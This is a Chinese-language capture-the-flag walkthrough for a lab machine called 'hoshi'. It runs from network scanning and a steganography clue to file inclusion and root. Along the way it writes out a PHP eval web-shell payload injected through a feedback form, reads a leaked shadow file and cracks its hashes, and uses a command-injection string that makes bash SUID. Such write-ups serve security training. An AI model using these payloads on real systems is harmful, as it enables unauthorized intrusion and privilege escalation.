# 一、信息收集

## 1. 主机发现

首先，使用 `arp-scan` 在 `192.168.205.0/24` 网段中发现目标主机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.142 08:00:27:24:64:43       PCS Systemtechnik GmbH
...
```

确认目标主机IP地址为 `192.168.205.142`。

## 2. 端口扫描

使用 `nmap` 对目标主机进行全端口扫描，识别开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.142
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

扫描结果显示开放了 **22 (SSH)** 和 **80 (HTTP)** 两个端口。我们将Web服务作为主要的攻击入口。

## 3. Web目录与文件发现

访问 `http://192.168.205.142` 是一个“星际商城”的商品反馈页面。使用 `dirsearch` 进行目录爆破，发现多个关键文件。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ dirsearch -u http://192.168.205.142
...
[09:26:07] 200 -    1KB - /admin.php
[09:26:16] 200 -   23KB - /info.php
[09:26:22] 200 -  109B  - /robots.txt
[09:26:25] 301 -  320B  - /uploads  ->  http://192.168.205.142/uploads/
...
```

主要发现：

*   `/admin.php`: 后台登录页面。
*   `/info.php`: 一个 `phpinfo()` 页面，泄露了详细的PHP配置。
*   `/uploads/`: 一个开放目录浏览的上传目录。
*   `/robots.txt`: 存在有趣的信息。

## 4. 信息泄露

查看 `robots.txt` 文件内容，发现一条重要线索。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.142/robots.txt
本站的 logo 灵感来自 https://maze-sec.com/special/1/，但我们给它添了点特别的‘味道’！
```

该线索暗示网站的logo图片 `QQ.png` 可能被修改过，含有隐藏信息。

# 二、Web渗透与立足点

## 1. 后台登录

访问 `/admin.php` 是一个管理员登录页面，只需要输入密码。根据主页页脚的客服热线 `400-123-4567`，尝试以此作为密码进行登录，成功进入后台。

## 2. 图像隐写 (盲水印)

根据 `robots.txt` 的提示，我们怀疑logo图片存在隐写。

1. 分别下载目标网站的logo和原始logo。

   ```bash
   wget http://192.168.205.142/QQ.png -O target_logo.png
   wget https://maze-sec.com/img/QQ.png -O original_logo.png
   ```

2. 常规的隐写分析工具均未发现异常。考虑到“味道”这种描述，推测可能是盲水印（Blind Watermark）。

3. 使用盲水印工具进行解密，成功提取出隐藏的水印信息。

   ```bash
   # 克隆工具
   git clone https://github.com/chishaxie/BlindWaterMark.git
   cd BlindWaterMark
   
   # 解码
   python bwmforpy3.py decode target_logo.png original_logo.png wm_extracted.png
   ```

4. 查看提取出的水印图片 `wm_extracted.png`，得到隐藏的目录路径：`/hoshi/`。

![提取出的水印](http://7r1UMPHK.github.io/static/image/20250810220719846.webp)

## 3. 文件包含与Getshell

1. 访问新发现的路径 `http://192.168.205.142/hoshi/`，发现一个文件 `gift.php`。直接访问该文件返回错误“非法文件名”，这是典型的**文件包含（LFI）**漏洞特征。

2. 通过Fuzz工具 `ffuf` 爆破参数，确定用于文件包含的参数为 `file`。

3. 在 `admin.php` 页面源码中，发现一行隐藏的注释：`<div style="display:none" id="static-tip">[debug] 静态页面已生成</div>`。

4. **攻击链梳理**：

   *   在主页 `/index.php` 的反馈表单中提交PHP Web Shell。
   *   登录后台 `/admin.php`。这个登录行为会触发服务器将在后台生成一个包含所有反馈内容的静态文件 `admin.html`。（通过目录爆破发现）
   *   利用 `gift.php` 的文件包含漏洞去读取这个新生成的 `admin.html`。由于该文件是被PHP引擎包含的，其中的PHP代码将会被执行。

5. **操作步骤**:

   * **步骤一：注入Payload**。在主页的反馈表单中的"您的昵称"输入栏提交以下内容。

     ```php
     <?php eval($_POST['ant']); ?>
     ```

   * **步骤二：触发生成**。访问 `/admin.php` 并使用密码 `400-123-4567` 登录。此时，包含我们Payload的 `admin.html` 文件已经在Web根目录生成。

   * **步骤三：构造LFI URL**。`http://192.168.205.142/hoshi/gift.php?file=admin.html`

   * **步骤四：连接Shell**。使用蚁剑（AntSword）连接上述URL，密码为 `ant`，成功获得 `www-data` 用户的Web Shell。

# 三、权限提升

## 1. 横向移动 (www-data -> welcome)

1. 在 `www-data` shell中，使用 `linpeas.sh` 等脚本进行信息收集。在 `/var/backups/` 目录下发现一个可读的敏感文件 `shadow~`。

2. 读取该文件，获得 `root` 和 `welcome` 用户的密码哈希。

3. 使用 `John the Ripper` 和 `rockyou.txt` 字典对哈希进行破解，得到 `welcome` 用户的密码为 `loveme2`。

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ john --wordlist=rockyou.txt hash.txt
   ...
   loveme2          (welcome)     
   ...
   ```

4. 使用 `su` 命令和破解出的密码成功切换到 `welcome` 用户。

## 2. 提权至root (welcome -> root)

1. 在 `welcome` 用户下，使用 `sudo -l` 检查其sudo权限，发现可以无密码以root权限执行一个Python脚本 `/root/12345.py`。

   ```bash
   welcome@hoshi:/tmp$ sudo -l
   ...
   User welcome may run the following commands on hoshi:
       (ALL) NOPASSWD: /usr/bin/python3 /root/12345.py
   ```

2. 执行该脚本，它会在 `12345` 端口上开启一个自定义的配置shell。

3. 在Kali攻击机上，使用 `ncat` 连接该服务。通过 `help` 命令发现 `exec_cmd` 指令。测试发现 `|;&<>` 等字符被过滤，但 `&&` 可用于命令拼接。

4. 利用命令注入，为 `/bin/bash` 添加SUID权限。

   ```bash
   conf> exec_cmd id'&&chmod +s /bin/bash&&'
   uid=0(root) gid=0(root) groups=0(root)
   ```

5. 回到靶机shell，执行 `bash -p`，成功获得root权限的shell。

   ```bash
   welcome@hoshi:/opt$ bash -p
   bash-5.0# id
   uid=1000(welcome) gid=1000(welcome) euid=0(root) egid=0(root) groups=0(root),1000(welcome)
   ```

# 四、获取Flag

现在拥有了root权限，可以读取所有的Flag。

```bash
bash-5.0# cat /root/root.txt
flag{root-5de923e57adefd6a1fd53a6705ad6486}

bash-5.0# cat /home/welcome/user.txt
flag{user-73b671a5f913d849d405784a428288dd}
```

所有Flag均已找到，渗透测试完成。